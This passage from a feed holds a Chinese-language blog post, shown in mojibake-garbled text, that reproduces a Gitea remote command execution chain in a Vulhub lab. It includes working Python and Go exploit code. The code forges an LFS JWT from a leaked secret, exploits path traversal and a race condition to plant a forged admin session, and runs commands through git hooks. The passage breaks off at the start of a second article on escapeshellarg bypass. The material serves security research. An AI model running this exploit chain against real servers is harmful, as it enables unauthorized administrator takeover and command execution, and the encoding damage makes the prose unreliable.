href=&quot;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html#jwt&quot;&gt;æ¼æ´ä¸‰ã€è¯»å–é…ç½®æ–‡ä»¶ï¼Œæ„é€ JWTå¯†æ–‡&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;vulhub/repoè™½ç„¶æ˜¯ä¸€ä¸ªå…¬å¼€é¡¹ç›®ï¼Œä½†é»˜è®¤åªæœ‰è¯»æƒé™ã€‚æˆ‘ä»¬éœ€è¦è¿›ä¸€æ­¥åˆ©ç”¨ã€‚&lt;/p&gt;&lt;p&gt;æˆ‘ä»¬åˆ©ç”¨ç›®å½•ç©¿è¶Šæ¼æ´ï¼Œå¯ä»¥è¯»å–åˆ°giteaçš„é…ç½®æ–‡ä»¶ã€‚è¿™ä¸ªæ–‡ä»¶åœ¨$GITEA_CUSTOM/conf/app.iniï¼Œ$GITEA_CUSTOMæ˜¯giteaçš„æ ¹ç›®å½•ï¼Œé»˜è®¤æ˜¯/var/lib/gitea/ï¼Œåœ¨vulhubé‡Œæ˜¯/data/giteaã€‚&lt;/p&gt;&lt;p&gt;æ‰€ä»¥ï¼Œè¦ä»LFSçš„ç›®å½•è·¨è¶Šåˆ°$GITEA_CUSTOM/conf/app.iniï¼Œéœ€è¦æ„é€ å‡ºçš„Oidæ˜¯....gitea/conf/app.ini ï¼ˆç»è¿‡è½¬æ¢åå°±å˜æˆäº†/data/gitea/lfs/../../gitea/conf/app.iniï¼Œä¹Ÿå°±æ˜¯/data/gitea/conf/app.iniã€‚åŸæ¼æ´ä½œè€…ç»™å‡ºçš„POCè¿™ä¸€å—æ˜¯æœ‰å‘çš„ï¼Œè¿™ä¸ªOidéœ€è¦æ ¹æ®ä¸åŒ$GITEA_CUSTOMçš„è®¾ç½®è¿›è¡Œè°ƒæ•´ã€‚ï¼‰&lt;/p&gt;&lt;p&gt;æˆåŠŸè¯»å–åˆ°é…ç½®æ–‡ä»¶ï¼ˆä»éœ€å…ˆå‘é€POSTåŒ…åˆ›å»ºOidä¸º....gitea/conf/app.iniçš„LFSå¯¹è±¡ï¼‰ï¼š&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7b45c16567a56377885231cc84353a7b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;310&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-7b45c16567a56377885231cc84353a7b&quot; data-watermark-src=&quot;v2-47c9e387bc1818ef94ba83b04b5c7a8e&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;é…ç½®æ–‡ä»¶ä¸­æœ‰å¾ˆå¤šæ•æ„Ÿä¿¡æ¯ï¼Œå¦‚æ•°æ®åº“è´¦å·å¯†ç ã€ä¸€äº›Tokenç­‰ã€‚å¦‚æœæ˜¯sqliteæ•°æ®åº“ï¼Œæˆ‘ä»¬ç”šè‡³èƒ½ç›´æ¥ä¸‹è½½ä¹‹ã€‚å½“ç„¶ï¼Œå¯†ç åŠ äº†saltã€‚&lt;/p&gt;&lt;p&gt;Giteaä¸­ï¼ŒLFSçš„æ¥å£æ˜¯ä½¿ç”¨JWTè®¤è¯ï¼Œå…¶åŠ å¯†å¯†é’¥å°±æ˜¯é…ç½®æ–‡ä»¶ä¸­çš„LFS_JWT_SECRETã€‚æ‰€ä»¥ï¼Œè¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥ç”¨æ¥æ„é€ JWTè®¤è¯ï¼Œè¿›è€Œè·å–LFSå®Œæ•´çš„è¯»å†™æƒé™ã€‚&lt;/p&gt;&lt;p&gt;æˆ‘ä»¬ç”¨pythonæ¥ç”Ÿæˆå¯†æ–‡ï¼š&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;import jwt
import time
import base64
 
 
def decode_base64(data):
 missing_padding = len(data) % 4
 if missing_padding != 0:
 
data += &#39;=&#39;* (4 - missing_padding)
 return base64.urlsafe_b64decode(data)
 
 
jwt_secret = decode_base64(&#39;oUsPAAkeic6HaBMHPiTVHxTeCrEDc29sL6f0JuVp73c&#39;)
public_user_id = 1
public_repo_id = 1
nbf = int(time.time())-(60*60*24*1000)
exp = int(time.time())+(60*60*24*1000)
 
token = jwt.encode({&#39;user&#39;: public_user_id, &#39;repo&#39;: public_repo_id, &#39;op&#39;: &#39;upload&#39;, &#39;exp&#39;: exp, &#39;nbf&#39;: nbf}, jwt_secret, algorithm=&#39;HS256&#39;)
token = token.decode()
 
print(token)&lt;/code&gt;&lt;p&gt;å…¶ä¸­ï¼Œjwt_secretæ˜¯ç¬¬äºŒä¸ªæ¼æ´ä¸­è¯»å–åˆ°çš„å¯†é’¥ï¼›public_user_idæ˜¯é¡¹ç›®æ‰€æœ‰è€…çš„idï¼Œpublic_repo_idæ˜¯é¡¹ç›®idï¼Œè¿™ä¸ªé¡¹ç›®æŒ‡LFSæ‰€åœ¨çš„é¡¹ç›®ï¼›nbfæ˜¯æŒ‡è¿™ä¸ªå¯†æ–‡çš„å¼€å§‹æ—¶é—´ï¼Œexpæ˜¯è¿™ä¸ªå¯†æ–‡çš„ç»“æŸæ—¶é—´ï¼Œåªæœ‰å½“å‰æ—¶é—´å¤„äºè¿™ä¸¤ä¸ªå€¼ä¸­æ—¶ï¼Œè¿™ä¸ªå¯†æ–‡æ‰æœ‰æ•ˆã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-17a35c2d4302d791cab708317b57799a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;29&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;br&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html#_3&quot;&gt;æ¼æ´å››ã€åˆ©ç”¨æ¡ä»¶ç«äº‰ï¼Œå†™å…¥ä»»æ„æ–‡ä»¶&lt;/a&gt;&lt;br&gt;&lt;br&gt;&lt;/h2&gt;&lt;p&gt;ç°åœ¨ï¼Œæˆ‘ä»¬èƒ½æ„é€ JWTçš„å¯†æ–‡ï¼Œå³å¯è®¿é—®LFSä¸­çš„å†™å…¥æ–‡ä»¶æ¥å£ï¼Œä¹Ÿå°±æ˜¯PutHandlerã€‚&lt;br&gt;PUTæ“ä½œä¸»è¦æ˜¯å¦‚ä¸‹ä»£ç ï¼š&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-15b38cbef6917579ef30c29b98abe334_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;504&quot; data-rawheight=&quot;500&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-15b38cbef6917579ef30c29b98abe334&quot; data-watermark-src=&quot;v2-4f9ee61ea61472e828aa6b82a5c88b86&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;æ•´ä¸ªè¿‡ç¨‹æ•´ç†å¦‚ä¸‹ï¼š&lt;/p&gt;&lt;ol&gt;&lt;li&gt;transformKey(meta.Oid) + .tmp åç¼€ä½œä¸ºä¸´æ—¶æ–‡ä»¶å&lt;/li&gt;&lt;li&gt;å¦‚æœç›®å½•ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºç›®å½•&lt;/li&gt;&lt;li&gt;å°†ç”¨æˆ·ä¼ å…¥çš„å†…å®¹å†™å…¥ä¸´æ—¶æ–‡ä»¶&lt;/li&gt;&lt;li&gt;å¦‚æœæ–‡ä»¶å¤§å°å’Œmeta.Sizeä¸ä¸€è‡´ï¼Œåˆ™è¿”å›é”™è¯¯ï¼ˆmeta.sizeæ˜¯ç¬¬ä¸€æ­¥ä¸­åˆ›å»ºLFSæ—¶ä¼ å…¥çš„Sizeå‚æ•°ï¼‰&lt;/li&gt;&lt;li&gt;å¦‚æœæ–‡ä»¶å“ˆå¸Œå’Œmeta.Oidä¸ä¸€è‡´ï¼Œåˆ™è¿”å›é”™è¯¯&lt;/li&gt;&lt;li&gt;å°†ä¸´æ—¶æ–‡ä»¶é‡å‘½åä¸ºçœŸæ­£çš„æ–‡ä»¶å&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;å› ä¸ºæˆ‘ä»¬éœ€è¦å†™å…¥ä»»æ„æ–‡ä»¶ï¼Œæ‰€ä»¥Oidä¸€å®šæ˜¯èƒ½å¤Ÿç©¿è¶Šåˆ°å…¶ä»–ç›®å½•çš„ä¸€ä¸ªæ¶æ„å­—ç¬¦ä¸²ï¼Œè€Œä¸€ä¸ªæ–‡ä»¶çš„å“ˆå¸Œï¼ˆsha256ï¼‰å´åªæ˜¯ä¸€ä¸ªHEXå­—ç¬¦ä¸²ã€‚æ‰€ä»¥ä¸Šé¢çš„ç¬¬5æ­¥ï¼Œä¸€å®šä¼šå¤±è´¥å¯¼è‡´é€€å‡ºï¼Œæ‰€ä»¥ä¸å¯èƒ½æ‰§è¡Œåˆ°ç¬¬6æ­¥ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬åªèƒ½å†™å…¥ä¸€ä¸ªåç¼€æ˜¯â€œ.tmpâ€çš„ä¸´æ—¶æ–‡ä»¶ã€‚&lt;br&gt;å¦å¤–ï¼Œä½œè€…ç”¨åˆ°äº†defer os.Remove(tmpPath)è¿™ä¸ªè¯­æ³•ã€‚åœ¨goè¯­è¨€ä¸­ï¼Œdeferä»£è¡¨å‡½æ•°è¿”å›æ—¶æ‰§è¡Œçš„æ“ä½œï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸ç®¡å‡½æ•°æ˜¯å¦è¿”å›é”™è¯¯ï¼Œç»“æŸæ—¶éƒ½ä¼šåˆ é™¤ä¸´æ—¶æ–‡ä»¶ã€‚&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;æ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦è§£å†³çš„æ˜¯ä¸¤ä¸ªé—®é¢˜ï¼š&lt;/p&gt;&lt;ol&gt;&lt;li&gt;èƒ½å¤Ÿå†™å…¥ä¸€ä¸ª.tmpä¸ºåç¼€çš„æ–‡ä»¶ï¼Œæ€ä¹ˆåˆ©ç”¨ï¼Ÿ&lt;/li&gt;&lt;li&gt;å¦‚ä½•è®©è¿™ä¸ªæ–‡ä»¶åœ¨åˆ©ç”¨æˆåŠŸä¹‹å‰ä¸è¢«åˆ é™¤ï¼Ÿ&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;æˆ‘ä»¬å…ˆæ€è€ƒç¬¬äºŒä¸ªé—®é¢˜ã€‚æ¼æ´å‘ç°è€…ç»™å‡ºçš„æ–¹æ³•æ˜¯ï¼Œåˆ©ç”¨æ¡ä»¶ç«äº‰ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;å› ä¸ºgiteaä¸­æ˜¯ç”¨æµå¼æ–¹æ³•æ¥è¯»å–æ•°æ®åŒ…ï¼Œå¹¶å°†è¯»å–åˆ°çš„å†…å®¹å†™å…¥ä¸´æ—¶æ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨æµå¼HTTPæ–¹æ³•ï¼Œä¼ å…¥æˆ‘ä»¬éœ€è¦å†™å…¥çš„æ–‡ä»¶å†…å®¹ï¼Œç„¶åæŒ‚èµ·HTTPè¿æ¥ã€‚è¿™æ—¶å€™ï¼Œåç«¯ä¼šä¸€ç›´ç­‰å¾…æˆ‘ä¼ å‰©ä¸‹çš„å­—ç¬¦ï¼Œåœ¨è¿™ä¸ªæ—¶é—´å·®å†…ï¼ŒPutå‡½æ•°æ˜¯ç­‰å¾…åœ¨io.Copyé‚£ä¸ªæ­¥éª¤çš„ï¼Œå½“ç„¶ä¹Ÿå°±ä¸ä¼šåˆ é™¤ä¸´æ—¶æ–‡ä»¶äº†ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;é‚£ä¹ˆï¼Œæ€è€ƒç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œ.tmpä¸ºåç¼€çš„ä¸´æ—¶æ–‡ä»¶ï¼Œæˆ‘ä»¬èƒ½åšä»€ä¹ˆï¼Ÿ&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html#session&quot;&gt;æ¼æ´äº”ã€ä¼ªé€ sessionæå‡æƒé™&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;æœ€ç®€å•çš„ï¼Œæˆ‘ä»¬å¯ä»¥å‘/etc/cron.d/ä¸­å†™å…¥ä¸€ä¸ªcrontabé…ç½®æ–‡ä»¶ï¼Œç„¶ååå¼¹è·å–shellã€‚ä½†é€šå¸¸giteaä¸ä¼šè¿è¡Œåœ¨rootæƒé™ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ€è€ƒå…¶ä»–æ–¹æ³•ã€‚&lt;br&gt;giteaä½¿ç”¨&lt;a href=&quot;https://github.com/go-macaron/session&quot;&gt;go-macaron/session&lt;/a&gt;è¿™ä¸ªç¬¬ä¸‰æ–¹æ¨¡å—æ¥ç®¡ç†sessionï¼Œé»˜è®¤ä½¿ç”¨æ–‡ä»¶ä½œä¸ºsessionå­˜å‚¨å®¹å™¨ã€‚æˆ‘ä»¬æ¥é˜…è¯»&lt;a href=&quot;https://github.com/go-macaron/session/blob/master/file.go&quot;&gt;go-macaron/sessionæºç &lt;/a&gt;ï¼š&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-bf5e7b4dc3cc55db609410b23a438f9c_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;613&quot; data-rawheight=&quot;500&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-bf5e7b4dc3cc55db609410b23a438f9c&quot; data-watermark-src=&quot;v2-9eb7a8a6f3ef1b257e2296dd641f1efd&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;è¿™é‡Œé¢æœ‰å‡ ä¸ªå¾ˆé‡è¦çš„ç‚¹ï¼š&lt;/p&gt;&lt;ol&gt;&lt;li&gt;sessionæ–‡ä»¶åä¸ºsid[0]/sid[1]/sid&lt;/li&gt;&lt;li&gt;å¯¹è±¡è¢«ç”¨Gobåºåˆ—åŒ–åå­˜å…¥æ–‡ä»¶&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;Gobæ˜¯Goè¯­è¨€ç‹¬æœ‰çš„åºåˆ—åŒ–æ–¹æ³•ã€‚æˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€æ®µGoè¯­è¨€ç¨‹åºï¼Œæ¥ç”Ÿæˆä¸€æ®µGobç¼–ç çš„sessionï¼š&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;package
main
import (
  &quot;fmt&quot;
  &quot;encoding/gob&quot;
  &quot;bytes&quot;
  &quot;encoding/hex&quot;
)
func EncodeGob(obj map[interface{}]interface{}) ([]byte, error) {
  for _, v := range obj {
  gob.Register(v)
  }
   buf := bytes.NewBuffer(nil)
  err := gob.NewEncoder(buf).Encode(obj)
  return buf.Bytes(), err
}
func main() {
  var uid int64 = 1
  obj := map[interface{}]interface{} {&quot;_old_uid&quot;: &quot;1&quot;, &quot;uid&quot;: uid, &quot;uname&quot;: &quot;vulhub&quot; }
  data, err := EncodeGob(obj)
  if err != nil {
  fmt.Println(err)
  }
  edata := hex.EncodeToString(data)
  fmt.Println(edata)
}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;å…¶ä¸­ï¼Œ{&quot;_old_iod&quot;:&lt;br&gt;&quot;1&quot;, &quot;uid&quot;: uid, &quot;uname&quot;: &quot;vulhub&quot; }å°±æ˜¯sessionä¸­çš„æ•°æ®ï¼Œuidæ˜¯ç®¡ç†å‘˜idï¼Œunameæ˜¯ç®¡ç†å‘˜ç”¨æˆ·åã€‚ç¼–è¯‘å¹¶æ‰§è¡Œä¸Šè¿°ä»£ç ï¼Œå¾—åˆ°ä¸€ä¸²hexï¼Œå°±æ˜¯ä¼ªé€ çš„æ•°æ®ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;blockquote&gt;åŸä½œè€…ç»™å‡ºçš„POCæ˜¯ä»–ç”Ÿæˆå¥½çš„ä¸€æ®µäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œuidå’Œunameä¸èƒ½è‡ªå®šä¹‰ã€‚&lt;/blockquote&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-cec39f215655fbd55a1977e1e5f900ff_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;359&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-cec39f215655fbd55a1977e1e5f900ff&quot; data-watermark-src=&quot;v2-9538e95bc0f3bc1e535aa76b1801b955&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;æ¥ç€ï¼Œæˆ‘å†™äº†ä¸€ä¸ªç®€å•çš„Pythonè„šæœ¬æ¥è¿›è¡Œåç»­åˆ©ç”¨ï¼ˆéœ€è¦Python3.6ï¼‰ï¼š&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
import
requests
import jwt
import time
import base64
import logging
import sys
import json
from urllib.parse import quote
 
 
logging.basicConfig(stream=sys.stdout, level=logging.DEBUG)
 
BASE_URL = &#39;http://your-ip:3000/vulhub/repo&#39;
JWT_SECRET = &#39;AzDE6jvaOhh_u30cmkbEqmOdl8h34zOyxfqcieuAu9Y&#39;
USER_ID = 1
REPO_ID = 1
SESSION_ID = &#39;11vulhub&#39;
SESSION_DATA = bytes.fromhex(&#39;0eff81040102ff82000110011000005cff82000306737472696e670c0a00085f6f6c645f75696406737472696e670c0300013106737472696e670c05000375696405696e7436340402000206737472696e670c070005756e616d6506737472696e670c08000676756c687562&#39;)
 
 
def generate_token():
  def decode_base64(data):
  missing_padding = len(data) % 4
  if missing_padding != 0:
  data += &#39;=&#39;* (4 - missing_padding)
  return base64.urlsafe_b64decode(data)
 
  nbf = int(time.time())-(60*60*24*1000)
  exp = int(time.time())+(60*60*24*1000)
 
  token = jwt.encode({&#39;user&#39;: USER_ID, &#39;repo&#39;: REPO_ID, &#39;op&#39;: &#39;upload&#39;, &#39;exp&#39;: exp, &#39;nbf&#39;: nbf}, decode_base64(JWT_SECRET), algorithm=&#39;HS256&#39;)
  return token.decode()
 
def gen_data():
  yield SESSION_DATA
  time.sleep(300)
  yield b&#39;&#39;
 
 
OID = f&#39;....gitea/sessions/{SESSION_ID[0]}/{SESSION_ID[1]}/{SESSION_ID}&#39;
response = requests.post(f&#39;{BASE_URL}.git/info/lfs/objects&#39;, headers={
  &#39;Accept&#39;: &#39;application/vnd.git-lfs+json&#39;
}, json={
  &quot;Oid&quot;: OID,
  &quot;Size&quot;: 100000,
  &quot;User&quot; : &quot;a&quot;,
  &quot;Password&quot; : &quot;a&quot;,
  &quot;Repo&quot; : &quot;a&quot;,
  &quot;Authorization&quot; : &quot;a&quot;
})
logging.info(response.text)
 
response = requests.put(f&quot;{BASE_URL}.git/info/lfs/objects/{quote(OID,
safe=&#39;&#39;)}&quot;, data=gen_data(), headers={
  &#39;Accept&#39;: &#39;application/vnd.git-lfs&#39;,
  &#39;Content-Type&#39;: &#39;application/vnd.git-lfs&#39;,
  &#39;Authorization&#39;: f&#39;Bearer {generate_token()}&#39;
 })
 &lt;/code&gt;&lt;p&gt;&lt;br&gt;è¿™ä¸ªè„šæœ¬ä¼šå°†ä¼ªé€ çš„SESSIONæ•°æ®å‘é€ï¼Œå¹¶ç­‰å¾…300ç§’åæ‰å…³é—­è¿æ¥ã€‚åœ¨è¿™300ç§’ä¸­ï¼ŒæœåŠ¡å™¨ä¸Šå°†å­˜åœ¨ä¸€ä¸ªåä¸ºâ€œ11vulhub.tmpâ€çš„æ–‡ä»¶ï¼Œè¿™ä¹Ÿæ˜¯session idã€‚&lt;br&gt;å¸¦ä¸Šè¿™ä¸ªsession idï¼Œå³å¯æå‡ä¸ºç®¡ç†å‘˜ã€‚&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-9dda4f4e02021b5675b61871d00e8de4_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;127&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-9dda4f4e02021b5675b61871d00e8de4&quot; data-watermark-src=&quot;v2-7136e15e435578da17e4bb6dad48b71e&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;br&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html#hook&quot;&gt;æ¼æ´å…­ã€åˆ©ç”¨HOOKæ‰§è¡Œä»»æ„å‘½ä»¤&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;å¸¦ä¸Ši_like_gitea=11vulhub.tmpè¿™ä¸ªCookieï¼Œæˆ‘ä»¬å³å¯è®¿é—®ç®¡ç†å‘˜è´¦æˆ·ã€‚&lt;/p&gt;&lt;p&gt;ç„¶åéšä¾¿æ‰¾ä¸ªé¡¹ç›®ï¼Œåœ¨è®¾ç½®ä¸­é…ç½®Gité’©å­ã€‚Gité’©å­æ˜¯æ‰§è¡Œgitå‘½ä»¤çš„æ—¶å€™ï¼Œä¼šè¢«è‡ªåŠ¨æ‰§è¡Œçš„ä¸€æ®µè„šæœ¬ã€‚æ¯”å¦‚æˆ‘è¿™é‡Œç”¨çš„pre-receiveé’©å­ï¼Œå°±æ˜¯åœ¨commitä¹‹å‰ä¼šæ‰§è¡Œçš„è„šæœ¬ã€‚æˆ‘åœ¨å…¶ä¸­åŠ å…¥å¾…æ‰§è¡Œçš„å‘½ä»¤touch /tmp/successï¼š&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0116e408d9f16943dbcd04281e42802e_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;499&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-0116e408d9f16943dbcd04281e42802e&quot; data-watermark-src=&quot;v2-550ed3d2be9de09fb12ef1f8d6b9b64f&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;ç„¶ååœ¨ç½‘é¡µç«¯æ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œç‚¹æäº¤ã€‚è¿›å…¥dockerå®¹å™¨ï¼Œå¯è§å‘½ä»¤è¢«æˆåŠŸæ‰§è¡Œï¼š&lt;br&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-4017029fca44f5c49c9db47e4c205686_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;499&quot; data-rawheight=&quot;90&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-4017029fca44f5c49c9db47e4c205686&quot; data-watermark-src=&quot;v2-ca1d8fa8d7a91e678ced68b07f33c4a6&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;br&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/gitea-remote-command-execution.html#_4&quot;&gt;ä¸€äº›æ€è€ƒ&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;æ•´ä¸ªæ¼æ´é“¾éå¸¸æµç•…ï¼ŒGo Webç«¯çš„ä»£ç å®¡è®¡ä¹Ÿéå¸¸å°‘è§ï¼Œåœ¨ä¼ ç»Ÿæ¼æ´è¶Šæ¥è¶Šå°‘çš„æƒ…å†µä¸‹ï¼Œè¿™äº›å¥½æ€è·¯å°†ç»™å®‰å…¨ç ”ç©¶è€…å¸¦æ¥å¾ˆå¤šä¸ä¸€æ ·çš„çªç ´ã€‚&lt;br&gt;ä¸è¿‡æ¼æ´ä½œè€…ç»™å‡ºçš„POCå®åœ¨æ˜¯æ¯”è¾ƒçƒ‚ï¼ŒåŸºæœ¬ç¦»å¼€äº†ä»–è‡ªå·±çš„ç¯å¢ƒå°±ä¸èƒ½ç”¨äº†ï¼Œè€Œä¸”æˆ‘ä¹Ÿä¸å»ºè®®ç”¨ä¸€é”®åŒ–çš„æ¼æ´åˆ©ç”¨è„šæœ¬æ¥å¤ç°è¿™ä¸ªæ¼æ´ï¼ŒåŸå› æ˜¯è¿™ä¸ªæ¼æ´çš„åˆ©ç”¨æ¶‰åŠåˆ°ä¸€äº›ä¸ç¡®å®šé‡ï¼Œæ¯”å¦‚ï¼š&lt;/p&gt;&lt;ol&gt;&lt;li&gt;giteaçš„$GITEA_CUSTOMï¼Œè¿™ä¸ªå€¼å½±å“åˆ°è¯»å–app.iniçš„é‚£æ®µPOC&lt;/li&gt;&lt;li&gt;ç®¡ç†å‘˜çš„ç”¨æˆ·åå’ŒIDï¼Œè¿™ä¸ªå¯èƒ½éœ€è¦çŒœã€‚ä½†å…¶å®æˆ‘ä»¬ä¹Ÿæ²¡å¿…è¦å¿…é¡»ä¼ªé€ ç®¡ç†å‘˜çš„sessionï¼Œæˆ‘ä»¬å¯ä»¥ä¼ªé€ ä»»æ„ä¸€ä¸ªç”¨æˆ·çš„sessionï¼Œç„¶åè¿›å…¥ç½‘ç«™åå†æ‰¾æ‰¾çœ‹çœ‹æœ‰æ²¡æœ‰ç®¡ç†å‘˜æ‰€åˆ›å»ºçš„é¡¹ç›®ï¼Œå¦‚æœæœ‰çš„è¯ï¼Œå°±å¯ä»¥å¾—çŸ¥ç®¡ç†å‘˜çš„ç”¨æˆ·åäº†ã€‚&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;å¦å¤–ï¼Œå¤ç°æ¼æ´çš„æ—¶å€™ä¹Ÿé‡åˆ°è¿‡ä¸€äº›å‘ï¼Œæ¯”å¦‚giteaç¬¬ä¸€æ¬¡å®‰è£…å¥½ï¼Œå¦‚æœä¸é‡å¯çš„è¯ï¼Œä»–çš„sessionæ˜¯å­˜å‚¨åœ¨å†…å­˜é‡Œçš„ã€‚åªæœ‰ç¬¬ä¸€æ¬¡é‡å¯åï¼Œæ‰ä¼šä½¿ç”¨æ–‡ä»¶sessionï¼Œè¿™ä¸€ç‚¹éœ€è¦æ³¨æ„ã€‚&lt;br&gt;å¦‚æœç›®æ ‡ç³»ç»Ÿä½¿ç”¨çš„æ˜¯sqliteåšæ•°æ®åº“ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä¸‹è½½å…¶æ•°æ®åº“ï¼Œå¹¶æ‹¿åˆ°ä»–çš„å¯†ç å“ˆå¸Œå’Œå¦ä¸€ä¸ªéšæœºå­—ç¬¦ä¸²ï¼Œåˆ©ç”¨è¿™ä¸¤ä¸ªå€¼å…¶å®èƒ½ç›´æ¥ä¼ªé€ ç®¡ç†å‘˜çš„cookieï¼ˆåä¸ºgitea_incredibleï¼‰ï¼Œè¿™ä¸€ç‚¹æˆ‘å°±ä¸å†™äº†ï¼Œå¤§å®¶å¯ä»¥è‡ªå·±æŸ¥çœ‹æ–‡æ¡£ã€‚&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>å°è˜‘è‡</author>
<guid isPermaLink="false">2018-07-16-39835913</guid>
<pubDate>Mon, 16 Jul 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>è°ˆescapeshellargç»•è¿‡ä¸å‚æ•°æ³¨å…¥æ¼æ´</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-05-08-36591451.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/36591451&quot;&gt;åŸæ–‡&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-b381f753958bcf64068ff996bf76ca7b_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;å‚æ•°æ³¨å…¥æ¼æ´æ˜¯æŒ‡ï¼Œåœ¨æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™ï¼Œç”¨æˆ·æ§åˆ¶äº†å‘½ä»¤ä¸­çš„æŸä¸ªå‚æ•°ï¼Œå¹¶é€šè¿‡ä¸€äº›å±é™©çš„å‚æ•°åŠŸèƒ½ï¼Œè¾¾æˆæ”»å‡»çš„ç›®çš„ã€‚&lt;/p&gt;&lt;h2&gt;0x01 ä»gitlist 